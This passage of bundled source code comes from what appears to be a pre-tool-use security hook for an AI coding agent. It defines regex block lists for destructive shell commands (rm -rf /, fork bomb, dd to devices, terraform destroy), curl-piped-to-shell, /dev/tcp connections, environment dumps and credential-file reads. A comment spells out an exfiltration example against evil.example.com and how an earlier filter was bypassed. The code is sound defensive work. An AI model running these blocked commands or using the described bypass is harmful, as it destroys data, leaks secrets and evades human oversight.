    regex: new RegExp(`${ANCHOR}aws\\s+ec2\\s+terminate-instances\\b`, "i"),
    category: "aws",
    description: "aws ec2 terminate-instances \u2014 irreversible; instance store data lost"
  },
  // ecr delete-repository --force (deletes images)
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(`${ANCHOR}aws\\s+ecr\\s+delete-repository\\b[^\\n]*?\\s+--force\\b`, "i"),
    category: "aws",
    description: "aws ecr delete-repository --force \u2014 deletes repository and all images"
  },
  // eks delete-cluster
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(`${ANCHOR}aws\\s+eks\\s+delete-cluster\\b`, "i"),
    category: "aws",
    description: "aws eks delete-cluster \u2014 destroys the EKS control plane and managed nodes"
  }
];

// src/lib/dangerous-bash/filesystem.ts
var FILESYSTEM_PATTERNS = [
  // rm -rf / variants. Anchors tolerate compound bash ("cmd && rm -rf /"),
  // sudo, the `command` builtin wrapper, and absolute binary paths
  // ("/bin/rm -rf /") — the latter two escaped the original anchor (audit P1).
  {
    regex: /(?:^|[;&|]\s*|sudo\s+|command\s+)(?:\/(?:[\w.-]+\/)*)?rm\s+(-[a-zA-Z]*r[a-zA-Z]*f|--recursive.*--force|-rf)\s+\//,
    category: "filesystem",
    description: "rm -rf on root / absolute path"
  },
  {
    regex: /(?:^|[;&|]\s*|sudo\s+|command\s+)(?:\/(?:[\w.-]+\/)*)?rm\s+(-[a-zA-Z]*f[a-zA-Z]*r|--force.*--recursive|-fr)\s+\//,
    category: "filesystem",
    description: "rm -fr on root / absolute path"
  },
  {
    regex: /(?:^|[;&|]\s*|sudo\s+|command\s+)(?:\/(?:[\w.-]+\/)*)?rm\s+(-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-rf)\s+~/,
    category: "filesystem",
    description: "rm -rf on home directory"
  },
  {
    regex: /(?:^|[;&|]\s*|sudo\s+|command\s+)(?:\/(?:[\w.-]+\/)*)?rm\s+(-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*|-fr)\s+~/,
    category: "filesystem",
    description: "rm -fr on home directory"
  },
  // rm with SPLIT recursive+force flags ("rm -r -f /", "rm --recursive
  // --force ~") — the combined-token patterns above never matched these
  // (audit P1: flag tokenization). Both flag orders, root or home target.
  {
    regex: /(?:^|[;&|]\s*|sudo\s+|command\s+)(?:\/(?:[\w.-]+\/)*)?rm\s+(?:--?[a-zA-Z][a-zA-Z-]*\s+)*-(?:[a-zA-Z]*r[a-zA-Z]*|-recursive)\s+(?:--?[a-zA-Z][a-zA-Z-]*\s+)*-(?:[a-zA-Z]*f[a-zA-Z]*|-force)\s+[/~]/,
    category: "filesystem",
    description: "rm with split recursive+force flags (e.g. rm -r -f /) on root or home"
  },
  {
    regex: /(?:^|[;&|]\s*|sudo\s+|command\s+)(?:\/(?:[\w.-]+\/)*)?rm\s+(?:--?[a-zA-Z][a-zA-Z-]*\s+)*-(?:[a-zA-Z]*f[a-zA-Z]*|-force)\s+(?:--?[a-zA-Z][a-zA-Z-]*\s+)*-(?:[a-zA-Z]*r[a-zA-Z]*|-recursive)\s+[/~]/,
    category: "filesystem",
    description: "rm with split force+recursive flags (e.g. rm -f -r /) on root or home"
  },
  // rmdir on system root / critical paths (CC v2.1.116 alignment).
  // CC's auto-allow previously bypassed dangerous-path check for rmdir; our
  // hook denies rmdir on root and critical paths defense-in-depth.
  {
    regex: /(?:^|[;&|]\s*|sudo\s+)rmdir\s+(-p\s+)?\/\s*$/,
    category: "filesystem",
    description: "rmdir on root"
  },
  {
    regex: /(?:^|[;&|]\s*|sudo\s+)rmdir\s+(-p\s+)?\/(?:private\/(?:etc|var|tmp|home)|etc|var|System|usr|bin|sbin|boot)/,
    category: "filesystem",
    description: "rmdir on critical system path"
  },
  // Direct device writes (compound-aware)
  {
    regex: /(?:^|[;&|]\s*|sudo\s+)dd\s+.*of=\/dev\//,
    category: "filesystem",
    description: "dd writing to a device file"
  },
  {
    regex: /(?:^|[;&|]\s*|sudo\s+)mkfs\./,
    category: "filesystem",
    description: "mkfs filesystem creation"
  },
  {
    regex: /(?:^|[;&|]\s*|sudo\s+)format\s+\/dev\//,
    category: "filesystem",
    description: "format on a device file"
  },
  // Fork bomb
  {
    regex: /:\(\)\{.*:\|:.*\};:/,
    category: "filesystem",
    description: "fork bomb pattern"
  },
  // Dangerous redirects/moves (compound-aware)
  {
    regex: /(?:^|[;&|]\s*|sudo\s+)mv\s+.*\s+\/dev\/null/,
    category: "filesystem",
    description: "mv to /dev/null (data destruction)"
  },
  // Dangerous permission changes (compound-aware). Target covers absolute
  // paths AND home (`chmod -R 777 ~`); anchor covers `command` + binary
  // paths like the rm patterns above (audit P1).
  {
    regex: /(?:^|[;&|]\s*|sudo\s+|command\s+)(?:\/(?:[\w.-]+\/)*)?chmod\s+-R\s+777\s+[/~]/,
    category: "filesystem",
    description: "chmod -R 777 on absolute path or home"
  },
  {
    regex: /chown\s+-R\s+root\s+\//,
    category: "filesystem",
    description: "chown -R root on absolute path"
  },
  // Direct disk writes
  {
    regex: />\s*\/dev\/sda/,
    category: "filesystem",
    description: "redirect to /dev/sda (disk overwrite)"
  },
  // Network redirects via /dev/tcp and /dev/udp (CC v2.1.98 alignment).
  // These bash pseudo-devices enable covert network connections:
  // exec 3<>/dev/tcp/host/port, cat < /dev/tcp/host/80, echo > /dev/udp/host/53
  {
    regex: /\/dev\/tcp\//,
    category: "filesystem",
    description: "/dev/tcp pseudo-device (covert network connection)"
  },
  {
    regex: /\/dev\/udp\//,
    category: "filesystem",
    description: "/dev/udp pseudo-device (covert network connection)"
  }
];

// src/lib/dangerous-bash/http.ts
var HTTP_PATTERNS = [
  // Remote content piped straight into a shell — the canonical supply-chain
  // RCE (`curl … | sh`). Matches any later pipe segment so `| sudo bash`
  // and flagged forms (`bash -s -- …`) are caught too.
  {
    regex: /\b(?:curl|wget)\b[^\n]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|ksh)\b/i,
    category: "http",
    description: "remote content piped to a shell (curl|sh supply-chain RCE)"
  },
  // Remote content piped into an interpreter's stdin-as-code form (bare or
  // `-`). Argument forms (`python -m json.tool`, `python script.py`) read
  // stdin as data, not code, and stay allowed.
  {
    regex: /\b(?:curl|wget)\b[^\n]*\|\s*(?:sudo\s+)?(?:python3?|perl|ruby|node)(?:\s+-)?\s*(?:[;&|]|$)/i,
    category: "http",
    description: "remote content piped to an interpreter as code (curl|python RCE)"
  },
  // curl with -X / --request followed by a destructive verb. Tolerates the
  // glued (`-XDELETE`) and equals (`--request=DELETE`) forms.
  {
    regex: /(?:^|[;&|]\s*|sudo\s+)curl\b[^\n]*?\s+(?:-X\s*|--request[\s=]\s*)(?:DELETE|PUT|PATCH)\b/i,
    category: "http",
    description: "curl with destructive HTTP verb (DELETE/PUT/PATCH) \u2014 blocks agent-driven API mutations"
  },
  // wget --method=DELETE/PUT/PATCH
  {
    regex: /(?:^|[;&|]\s*|sudo\s+)wget\b[^\n]*?\s+--method=(?:DELETE|PUT|PATCH)\b/i,
    category: "http",
    description: "wget with destructive HTTP verb (DELETE/PUT/PATCH)"
  },
  // httpie: `http DELETE ...` or `httpie PUT ...`
  {
    regex: /(?:^|[;&|]\s*|sudo\s+)(?:http|httpie)\s+(?:DELETE|PUT|PATCH)\b/i,
    category: "http",
    description: "httpie with destructive HTTP verb (DELETE/PUT/PATCH)"
  }
];

// src/lib/dangerous-bash/terraform.ts
var ANCHOR2 = String.raw`(?:^|[;&|]\s*|sudo\s+)`;
var TERRAFORM_PATTERNS = [
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(`${ANCHOR2}terraform\\s+destroy\\b`, "i"),
    category: "terraform",
    description: "terraform destroy \u2014 irreversibly tears down all resources in the configuration"
  },
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(`${ANCHOR2}terraform\\s+state\\s+rm\\b`, "i"),
    category: "terraform",
    description: "terraform state rm \u2014 removes resources from state, causing drift or accidental recreation"
  },
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(`${ANCHOR2}terraform\\s+workspace\\s+delete\\b`, "i"),
    category: "terraform",
    description: "terraform workspace delete \u2014 deletes the workspace state file"
  }
];

// src/lib/dangerous-bash/index.ts
var ALL_CATEGORIES = {
  filesystem: FILESYSTEM_PATTERNS,
  http: HTTP_PATTERNS,
  aws: AWS_PATTERNS,
  terraform: TERRAFORM_PATTERNS
};
function getDisabledCategories() {
  const raw = process.env["CTK_DISABLE_CATEGORY"];
  if (!raw) return /* @__PURE__ */ new Set();
  const parsed = raw.split(",").map((s) => s.trim()).filter(Boolean);
  return new Set(parsed.filter((c) => c in ALL_CATEGORIES));
}
function matchDangerousBash(command) {
  const disabled = getDisabledCategories();
  const order = ["filesystem", "http", "aws", "terraform"];
  for (const category of order) {
    if (disabled.has(category)) continue;
    for (const pattern of ALL_CATEGORIES[category]) {
      const match = pattern.regex.exec(command);
      if (match) {
        return { pattern, matchedText: match[0] };
      }
    }
  }
  return null;
}

// src/pretool/security-blocker.ts
var HOOK_NAME6 = "pre-tool-use-security";
var FILE_WRITE_TOOLS = /* @__PURE__ */ new Set(["Write", "Edit", "MultiEdit"]);
FILESYSTEM_PATTERNS.map(
  (p) => p.regex
);
var ENV_DUMP_PATTERNS = [
  // printenv (with or without args, always dumps env info)
  // Compound + sudo aware (CC v2.1.98 alignment).
  // The optional absolute-path prefix matters: an invocation by full path was
  // previously caught only as a side effect of the blanket /usr/ path rule, so
  // relaxing that rule without this would have opened a real dump bypass.
  /(?:^|[|&;]\s*|sudo\s+)(?:\/(?:[\w.-]+\/)*)?printenv(?:\s|$)/,
  // env alone or piped — still NOT env VAR=val cmd, env -i, or `env python`,
  // because `env` must be followed by end-of-command or a separator.
  /(?:^|[|&;]\s*|sudo\s+)(?:\/(?:[\w.-]+\/)*)?env\s*(?:$|[|&;])/,
  // set alone or piped (but NOT set -e, set -x, set -o)
  /(?:^|[|&;]\s*|sudo\s+)set\s*(?:$|[|&;])/,
  // export -p (list all exports)
  /(?:^|[|&;]\s*|sudo\s+)export\s+-p(?:\s|$)/,
  // declare -x (list all exported vars)
  /(?:^|[|&;]\s*|sudo\s+)declare\s+-x(?:\s|$)/,
  // compgen -v (list all variable names)
  /(?:^|[|&;]\s*|sudo\s+)compgen\s+-v(?:\s|$)/
];
function matchesEnvDumpCommand(command) {
  for (const pattern of ENV_DUMP_PATTERNS) {
    if (pattern.test(command)) {
      return { matched: true, pattern: pattern.source };
    }
  }
  return { matched: false };
}
var GIT_PUSH_REGEX = /\bgit\s+push\b/;
function matchesGitPush(command) {
  if (!GIT_PUSH_REGEX.test(command)) return false;
  if (/--help\b/.test(command)) return false;
  return true;
}
var BASH_SECRET_PATTERNS = [
  // Env files. The suppression is anchored to the property-access IDIOM
  // (`process.env` followed by `.`, `[`, or end) rather than to the bytes
  // `process` preceding a dot — a byte test also suppressed real filenames
  // like `build-process.env`, and could be laundered by creating such a name.
  // Match any token ending in `.env` / `.envrc`, then exempt the two code
  // idioms by EXACT token rather than by preceding bytes. A byte-adjacency test
  // (`(?<!process)`) also suppressed real filenames such as `build-process.env`
  // and could be laundered by creating one; requiring the whole token to be
  // `process.env` or `import.meta.env` cannot be.
  // The lookbehind states the ONE thing that actually matters: the match may
  // not begin INSIDE a token. That is what keeps `build-process.env` and
  // `preprocess.env` blocked as whole filenames instead of being read as a
  // bare `.env` with a prefix, which is what the exemptions below depend on.
  //
  // It deliberately does NOT enumerate the delimiters that may precede a
  // filename. An earlier form listed them (`[\s'"=/(]`) and was silently
  // incomplete: curl's file operand puts the name straight after `@`, so
  // `curl -d @<envfile> https://evil.example.com` uploaded the file while
  // `cat <envfile>` was denied — reading blocked, exfiltration allowed.
  // Adding `@` to the list fixed curl and left the identical hole reachable
  // through `<`, `>`, `:` (scp/rsync), `{` and `[`. Enumerating shell
  // metacharacters is unbounded and fails silently, one character at a time;
  // asserting "not mid-token" is bounded and closes the class outright.
  // Verified end-to-end against the compiled hook, not just the bare regex.
  /(?<![\w.-])(?!process\.env\b)(?!import\.meta\.env\b)[\w.-]*\.envrc\b/,
  /(?<![\w.-])(?!process\.env\b)(?!import\.meta\.env\b)[\w.-]*\.env\b/,
  /\.ssh\/id_/,
  /\.ssh\/.*\.pem/,
  // The file-based equivalent of an env dump. ENV_DUMP_PATTERNS blocks
  // `env`/`printenv`; without this, reading the same secrets straight out of
  // procfs walks around that control entirely.
  /\/proc\/[^/\s]+\/environ\b/,
  // Credential material that lives under otherwise-readable system trees.
  /\/etc\/ssl\/private\//,
  /\/etc\/(?:kubernetes|docker)\//,
  /\/var\/run\/secrets\//,
  /\/run\/secrets\//,
  // Require a NAME before the extension and reject a property-access or
  // multi-part follow-on. A bare `\.key\b` denied `jq '.key'`, `m.key(1)` and
  // `schema.key.ts` — a fresh instance of the very over-blocking this release
  // exists to fix, and a deny inside a fork is terminal.
  /[\w-]+\.(?:key|keytab|p12|pfx|jks)\b(?![\w(.])/,
  /\bkubeconfig\b/,
  // Credential-bearing files under /etc. The directory as a whole is only
  // mutation-gated (reading /etc/hosts is routine), but these specific entries
  // are secrets or account data and stay read-blocked.
  /\/etc\/(?:passwd|shadow|sudoers|gshadow|master\.passwd)\b/,
  /\/etc\/ssh\//,
  // Another user's home directory — never a legitimate read for our purposes.
  /\/root\//,
  // macOS temp/home trees. Kept as always-block rather than mutation-gated:
  // the scratchpad carve-out below already solves the false-positive that
  // motivated relaxing these, so there is no reason to widen read access.
  /\/private\/tmp\/(?!claude-\d+\/)/,
  // Companion guard — bash patterns match RAW command text with no `..`
  // normalization, so a traversal spelled from inside the allowed prefix
  // would otherwise slip past the lookahead above.
  /\/private\/tmp\/claude-\d+\/\S*\.\.(\/|\s|$)/,
  /\/private\/home\//
];
var BASH_SYSTEM_DIR_PATTERNS = [
  /\/etc\//,
  /\/usr\//,
  /\/var\//,
  /\/sys\//,
  /\/proc\//,
  /\/boot\//
];
[
  ...BASH_SECRET_PATTERNS,
  ...BASH_SYSTEM_DIR_PATTERNS
];
function matchesSystemDirMutation(command) {
  for (const pattern of BASH_SYSTEM_DIR_PATTERNS) {
    if (pattern.test(command)) {
      return { matched: true, pattern: pattern.source };
    }
  }
  return { matched: false };
}
var PATTERN_CHECKS2 = [
  {
    patterns: ENV_PATTERNS,
    category: "env",
    friendlyName: "Environment file"
  },
  {
    patterns: GIT_PATTERNS,
    category: "git",
    friendlyName: "Git configuration"
  },
  {
    patterns: SSH_PATTERNS,
    category: "ssh",
    friendlyName: "SSH key/certificate"
  },
  {
    patterns: CREDENTIAL_PATTERNS,
    category: "credential",
    friendlyName: "Credentials file"
  },
  {
    patterns: SYSTEM_DIR_PATTERNS,
    category: "system",
    friendlyName: "System directory"
  }
];
function normalizeBashEscapes(command) {
  return command.replace(/\\([-a-zA-Z0-9_./])/g, "$1");
}
function normalizeHomeRefs(command) {
  return command.replace(/"\$\{?HOME\}?"/g, "~").replace(/"\$\{?HOME\}?\/([^"]*)"/g, "~/$1").replace(/\$\{?HOME\}?(?=[/\s"';&|)<>`]|$)/g, "~");
}
function unwrapExecWrappers(command) {
  let current = command.trim();
  for (let i = 0; i < 4; i++) {
    const shBashMatch = current.match(
      /^(?:sudo\s+)?(?:\/[^\s]*\/)?(?:sh|bash|zsh|dash)\s+-c\s+(?:'([^']*)'|"([^"]*)"|(\S.*))$/
    );
    if (shBashMatch) {
      current = (shBashMatch[1] ?? shBashMatch[2] ?? shBashMatch[3] ?? "").trim();
      continue;
    }
    const envMatch = current.match(
      /^(?:sudo\s+)?env(?:\s+-i)?((?:\s+[A-Za-z_][A-Za-z0-9_]*=\S*)*)\s+(.+)$/
    );
    if (envMatch?.[2]) {
      current = envMatch[2].trim();
      continue;
    }
    break;
  }
  return current;
}
function matchesBashSensitivePattern(command) {
  for (const pattern of BASH_SECRET_PATTERNS) {
    if (pattern.test(command)) {
      return { matched: true, pattern: pattern.source };
    }
  }
  return matchesSystemDirMutation(command);
}
function validateBashCommand(command, sessionId, agentContext) {
  const normalized = normalizeHomeRefs(normalizeBashEscapes(command));
  const unwrapped = unwrapExecWrappers(normalized);
  const candidates = unwrapped === normalized ? [normalized] : [normalized, unwrapped];
  for (const candidate of candidates) {
    const match = matchDangerousBash(candidate);
    if (match) {
      const reason = `Dangerous command detected (${match.pattern.category}): ${match.pattern.description}`;
      logWarn(HOOK_NAME6, `Blocked: ${reason}`);
      logPermission("deny", reason, "Bash", sessionId, agentContext);
      return outputDeny(
        `BLOCKED: Dangerous command detected.

Category: ${match.pattern.category}
Reason: ${match.pattern.description}
Pattern matched: ${match.pattern.regex.source}`
      );
    }
  }
  for (const candidate of candidates) {
    const envDumpMatch = matchesEnvDumpCommand(candidate);
    if (envDumpMatch.matched) {
      const reason = `Environment dump command detected. Pattern: ${envDumpMatch.pattern}`;
      logWarn(HOOK_NAME6, `Blocked: ${reason}`);
      logPermission("deny", reason, "Bash", sessionId, agentContext);
      return outputDeny(
        "BLOCKED: Environment dump command detected.\n\nThis command could expose secrets stored in environment variables.\nIf you need a specific variable, use: echo $VARIABLE_NAME"
      );
    }
  }
  for (const candidate of candidates) {
    const sensitiveMatch = matchesBashSensitivePattern(candidate);
    if (sensitiveMatch.matched) {
      const reason = `Command references sensitive file or directory. Pattern: ${sensitiveMatch.pattern}`;
      logWarn(HOOK_NAME6, `Blocked: ${reason}`);
      logPermission("deny", reason, "Bash", sessionId, agentContext);
      return outputDeny(
        `BLOCKED: Command references protected resource.

Protected resources include environment files, system directories, and SSH keys.
Pattern matched: ${sensitiveMatch.pattern}`
      );
    }
  }
  const pushGateResult = checkGitPushGate(candidates, sessionId, agentContext);
  if (pushGateResult) return pushGateResult;
  return outputSilentSuccess();
}
function checkGitPushGate(candidates, sessionId, agentContext) {
  for (const candidate of candidates) {
    if (!matchesGitPush(candidate)) continue;
    if (process.env["CLAUDE_AUTO_APPROVE_PUSH"] === "1") {
      logDebug(HOOK_NAME6, "git push auto-approved via CLAUDE_AUTO_APPROVE_PUSH=1");
      return null;
    }
    logDebug(
      HOOK_NAME6,
      `git push routed to user approval [session=${sessionId}, agent=${agentContext?.agentType ?? "none"}]`
    );
    return outputAsk();
  }
  return null;
}
function matchesProtectedPath(pathToCheck) {
  for (const config of PATTERN_CHECKS2) {
    for (const pattern of config.patterns) {
      if (pattern.test(pathToCheck)) {
        return {
          matched: true,
          category: config.category,
          pattern: pattern.source
        };
      }
    }
  }
  return { matched: false };
}
function getCategoryFriendlyName(category) {
  const config = PATTERN_CHECKS2.find((c) => c.category === category);
  return config?.friendlyName ?? category;
}
function validateFileOperation(filePath, toolName, sessionId, agentContext) {
  const normalizedPath = normalizePath(filePath);
  logDebug(HOOK_NAME6, `Normalized path: ${normalizedPath}`);
  if (normalizedPath.includes("..")) {
    const reason = `Path traversal detected in: ${filePath}`;
    logWarn(HOOK_NAME6, `Blocked: ${reason}`);
    logPermission("deny", reason, toolName, sessionId, agentContext);
    return outputDeny(
      `BLOCKED: Path traversal detected.

The path contains '..' which could be a security bypass attempt.
Path: ${filePath}`
    );
  }
  const realPath = resolveRealPath(filePath);
  logDebug(HOOK_NAME6, `Resolved path: ${realPath}`);
  const pathsToCheck = [normalizedPath, realPath];
  for (const checkPath of pathsToCheck) {
    const match = matchesProtectedPath(checkPath);
    if (match.matched && match.category) {
      const friendlyName = getCategoryFriendlyName(match.category);
      const reason = `${friendlyName} modification blocked. File: ${filePath} (resolved: ${realPath})`;
      logWarn(HOOK_NAME6, `Blocked: ${reason}`);
      logPermission("deny", reason, toolName, sessionId, agentContext);
      return outputDeny(
        `BLOCKED: ${friendlyName} modification blocked.

File: ${filePath}
Category: ${friendlyName}
Pattern matched: ${match.pattern}`
      );
    }
  }
  return outputSilentSuccess();
}
function extractAgentContext(input) {
  const agentId = getAgentId(input);
  const agentType = getAgentType(input);
  return agentId || agentType ? { agentId, agentType } : void 0;
}
function formatAgentDebug(toolName, ctx) {
  let msg = `Tool=${toolName}`;
  if (ctx?.agentType) msg += ` agent_type=${ctx.agentType}`;
  if (ctx?.agentId) msg += ` agent_id=${ctx.agentId}`;
  return msg;
}
async function securityBlocker(input) {
  const toolName = getToolName(input);
  const sessionId = getSessionId(input);
  const agentCtx = extractAgentContext(input);
  logDebug(HOOK_NAME6, formatAgentDebug(toolName, agentCtx));
  if (toolName === "Bash") {
    if (input.tool_input.dangerouslyDisableSandbox === true) {
      logWarn(
        HOOK_NAME6,
        `Sandbox disabled via dangerouslyDisableSandbox flag [session=${sessionId}]`
      );
    }
    const rawCommand = getCommand(input);
    const command = rawCommand ? stripProxyPrefix(rawCommand) : void 0;
    if (command) {
      const result = validateBashCommand(command, sessionId, agentCtx);
      if (result.continue && input.tool_input.dangerouslyDisableSandbox === true) {
        return outputWarning(
          "Bash sandbox is disabled (dangerouslyDisableSandbox=true). Command will run without sandbox restrictions."
        );
      }
      return result;
    }
    return outputSilentSuccess();
  }
  if (FILE_WRITE_TOOLS.has(toolName)) {
    const filePath = getFilePath(input);
    if (filePath) {
      return validateFileOperation(filePath, toolName, sessionId, agentCtx);
    }
    return outputSilentSuccess();
  }
  logDebug(HOOK_NAME6, `Tool ${toolName} allowed by default`);
  return outputSilentSuccess();
}

// src/lib/guards.ts
function runGuards(input, ...guards) {
  for (const guard of guards) {
    const result = guard(input);
    if (result !== null) {
      return result;
    }
  }
  return null;
}
function guardTool(input, ...toolNames) {
  const toolName = getToolName(input);
  if (!toolNames.includes(toolName)) {
    return outputSilentSuccess();
  }
  return null;
}
function guardBash(input) {
  return guardTool(input, "Bash");
}
function guardWriteEdit(input) {
  return guardTool(input, "Write", "Edit", "MultiEdit");
}
function guardHasCommand(input) {
  const command = getCommand(input);
  if (!command) {
    return outputSilentSuccess();
  }
  return null;
}
function guardHasFilePath(input) {
  const filePath = getFilePath(input);
  if (!filePath) {
    return outputSilentSuccess();
  }
  return null;
}

// src/permission/auto-approve-safe-bash.ts
var HOOK_NAME7 = "auto-approve-safe-bash";
var SAFE_COMMANDS_EXACT = [
  "pwd",
  "whoami",
  "id",
  "date",
  "uptime",
  "hostname"
];
var SAFE_COMMAND_PREFIXES = [
  // File listing
  "ls",
  "tree",
  "find ",
  // Note: space after to avoid matching 'findutils'
  "fd ",
  "du ",
  "df ",
  "stat ",
  "file ",
  "wc ",
  // File reading (non-destructive)
  "cat ",
  "head ",
  "tail ",
  "less ",
  "more ",
  "bat ",
  // Search tools
  "grep ",
  "rg ",
  "ag ",
  "ack ",
  "ripgrep ",
  // Git read-only operations
  "git status",
  "git log",
  "git diff",
  "git show",
  "git branch",
  "git remote -v",
  "git remote show",
  "git tag",
  "git describe",
  "git rev-parse",
  "git config --get",
  "git config --list",
  "git ls-files",
  "git ls-tree",
  "git cat-file",
  "git name-rev",
  "git shortlog",
  "git blame",
  "git stash list",
  // System info
  "which ",
  "type ",
  "command -v",
  "echo ",
  "printf ",
  // Package managers (list/show only)
  "npm list",
  "npm ls",
  "npm view",
  "npm info",
  "npm show",
  "npm outdated",
  "npm audit",
  // Read-only audit
  "pip list",
  "pip show",
  "pip freeze",
  "pip check",
  "poetry show",
  "uv pip list",
  "uv pip show",
  // Build tools (read-only)
  "mise tasks",
  "mise list",
  "mise current",
  "mise ls",
  // Node/Python info
  "node --version",
  "node -v",
  "npm --version",
  "npm -v",
  "python --version",
  "python -V",
  "python3 --version",
  "python3 -V",
  "pip --version",
  "pip -V",
  // Process info
  "ps ",
  "pgrep ",
  "lsof ",
  "top -l 1",
  // One snapshot only
  // Text processing (read-only)
  "fmt ",
  "comm ",
  "cmp ",
  "numfmt ",
  "expr ",
  "test ",
  "seq ",
  "tsort ",
  "pr ",
  "getconf ",
  // Terminal info
  "tput ",
  "ss ",
  // File finding (alternative names)
  "fdfind ",
  // Help commands. Bare `--help` / `-h` were REMOVED: getSafePrefix matched
  // them anywhere, so `evilcmd -h` auto-approved an arbitrary binary (help-flag
  // safety depends on the binary being trusted, not on the flag). `man ` stays.
  "man ",
  // Directory change — harmless alone; needed so a compound like `cd X && ls`
  // passes per-segment safety (the `cd X` segment must itself be safe).
  "cd "
];
var DANGEROUS_PATTERNS = [
  // Redirects (could overwrite files)
  />/,
  />>/,
  // Pipes to dangerous commands
  /\| *rm/,
  /\| *dd/,
  /\| *mv/,
  // Subshells with dangerous potential
  /\$\(/,
  /`/,
  // Process substitution `<(cmd)` runs cmd as a side effect — not caught by
  // segment splitting (it lives inside one segment), so block it here.
  /<\(/,
  // Pipe into a shell/interpreter — `curl x | sh`, `cat y | bash`, `| python`
  /\|\s*(?:sh|bash|zsh|dash|ksh|python3?|perl|ruby|node)\b/,
  // Backgrounding (could hide operations)
  /&$/,
  /& *$/
];
var REQUIRE_APPROVAL_PREFIXES = [
  // File modifications
  "rm ",
  "mv ",
  "cp ",
  "mkdir ",
  "rmdir ",
  "touch ",
  "chmod ",
  "chown ",
  "ln ",
  // Git write operations
  "git add",
  "git commit",
  "git push",
  "git pull",
  "git fetch",
  "git checkout",
  "git merge",
  "git rebase",
  "git reset",
  "git revert",
  "git cherry-pick",
  "git stash",
  "git clean",
  "git restore",
  "git switch",
  // Package installs
  "npm install",
  "npm i ",
  "npm ci",
  "npm uninstall",
  "npm update",
  "npm upgrade",
  "npm link",
  "npm publish",
  "pip install",
  "pip uninstall",
  "pip download",
  "poetry install",
  "poetry add",
  "poetry remove",
  "uv pip install",
  "uv pip uninstall",
  "brew install",
  "brew uninstall",
  "brew upgrade",
  "apt install",
  "apt remove",
  "apt update",
  "apt upgrade",
  // Network operations
  "curl ",
  "wget ",
  "ssh ",
  "scp ",
  "rsync ",
  "sftp ",
  // Dangerous system commands
  "sudo ",
  "su ",
  "dd ",
  "mkfs",
  "fdisk",
  "format",
  // Process control
  "kill ",
  "killall ",
  "pkill ",
  // Docker operations
  "docker run",
  "docker exec",
  "docker rm",
  "docker rmi",
  "docker stop",
  "docker kill",
  "docker compose"
];
function containsDangerousPattern(command) {
  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(command)) {
      return true;
    }
  }
  return false;
}
function hasEnvVarAssignment(command) {
  const segments = command.split(/\s*(?:&&|\|\||;|\|)\s*/);
  for (const segment of segments) {
    const trimmed = segment.trim();
    if (/^[A-Za-z_][A-Za-z0-9_]*=\S*\s+\S/.test(trimmed)) {
      return true;
    }
  }
  return false;
}
function findHasUnsafeAction(command) {
  if (!/\bfind\b/.test(command)) return false;
  return /\s-exec(?:dir)?\b|\s-delete\b/.test(command);
}
function requiresApproval(command) {
  for (const prefix of REQUIRE_APPROVAL_PREFIXES) {
    if (command.startsWith(prefix)) {
      return true;
    }
    if (command.includes(` ${prefix}`)) {
      return true;
    }
  }
  return false;
}
function isExactSafeCommand(command) {
  return SAFE_COMMANDS_EXACT.includes(command);
}
function splitIntoSegments(command) {
  return command.split(/\s*(?:&&|\|\||;|\||&|\n|\r)\s*/).map((s) => s.trim()).filter((s) => s.length > 0);
}
function isSegmentSafe(segment) {
  const trimmed = segment.trim();
  if (isExactSafeCommand(trimmed)) return true;
  return SAFE_COMMAND_PREFIXES.some((prefix) => trimmed.startsWith(prefix));
}
async function autoApproveSafeBash(input) {
  const skipped = runGuards(input, guardBash, guardHasCommand);
  if (skipped) return skipped;
  const command = getCommand(input);
  logDebug(HOOK_NAME7, `Evaluating: ${command.slice(0, 80)}...`);
  if (containsDangerousPattern(command)) {
    logDebug(HOOK_NAME7, "Requires approval: contains dangerous pattern");
    return outputSilentSuccess();
  }
  if (findHasUnsafeAction(command)) {
    logDebug(HOOK_NAME7, "Requires approval: find with -exec/-delete (CC v2.1.113)");
    return outputSilentSuccess();
  }
  if (hasEnvVarAssignment(command)) {
    logDebug(HOOK_NAME7, "Requires approval: env-var assignment prefix (CC v2.1.145 analog)");
    return outputSilentSuccess();
  }
  const segments = splitIntoSegments(command);
  if (segments.length === 0) {
    logDebug(HOOK_NAME7, "No parseable segment, deferring to standard flow");
    return outputSilentSuccess();
  }
  for (const rawSegment of segments) {
    const segment = stripProxyPrefix(rawSegment);
    if (requiresApproval(segment)) {
      logDebug(HOOK_NAME7, `Requires approval: segment '${segment.slice(0, 60)}'`);
      return outputSilentSuccess();
    }
    if (!isSegmentSafe(segment)) {
      logDebug(HOOK_NAME7, `Segment not on safe allowlist: '${segment.slice(0, 60)}'`);
      return outputSilentSuccess();
    }
  }
  const sessionId = getSessionId(input);
  logInfo(HOOK_NAME7, `Auto-approved: all ${segments.length} segment(s) safe`);
  logPermission("allow", `auto-approved safe command: ${command.slice(0, 80)}`, "Bash", sessionId);
  return outputAllow();
}

// src/permission/auto-approve-project-writes.ts
var HOOK_NAME8 = "auto-approve-project-writes";
var PROTECTED_DIRS = [
  "node_modules/",
  ".git/",
  ".husky/",
  // git hooks — auto-execute on commit/push (arbitrary code execution)
  ".githooks/",
  // alternate git hooks dir
  ".github/workflows/",
  // CI pipeline definitions — execute in CI (code execution)
  ".devcontainer/",
  // postCreateCommand etc. run on container open (code execution); CC guards this natively since v2.1.160
  "__pycache__/",
  ".venv/",
  "venv/",
  ".env/",
  "dist/",
  "build/",
  ".next/",
  ".cache/",
  "coverage/"
];
var PROTECTED_FILE_PATTERNS = [
  /\.env$/i,
  /\.env\./i,
  /\.envrc$/i,
  /credentials/i,
  /secrets/i,
  /\.pem$/i,
  /\.key$/i,
  /\.crt$/i,
  /id_rsa/i,
  /id_ed25519/i,
  /id_dsa/i,
  /id_ecdsa/i,
  /\.npmrc$/i,
  /\.pypirc$/i,
  /\.netrc$/i,
  /\.pgpass$/i,
  // Build-tool configs that grant code execution (CC guards these natively
  // under acceptEdits since v2.1.160). Without these entries they auto-approve
